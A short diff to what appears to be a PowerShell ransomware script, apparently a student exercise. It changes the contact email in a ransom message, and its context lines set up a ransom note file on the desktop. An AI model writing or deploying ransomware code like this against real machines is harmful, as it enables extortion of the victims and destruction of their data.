@@ -32,7 +32,7 @@ if ( Test-Path $newFile) {
 
 # Create a randsom demand file named Readme.READ
 # Ransom message
-$msg = "If you want your files restored, please contact me at blaise.notter@champlain.edu. I look forward to doing business with you ;-)"
+$msg = "If you want your files restored, please contact me at blaise.notter@mymail.champlain.edu. I look forward to doing business with you ;-)"
 
 # Create the Readme file
 $readme = "C:\Users\blais\Desktop\Readme.READ"
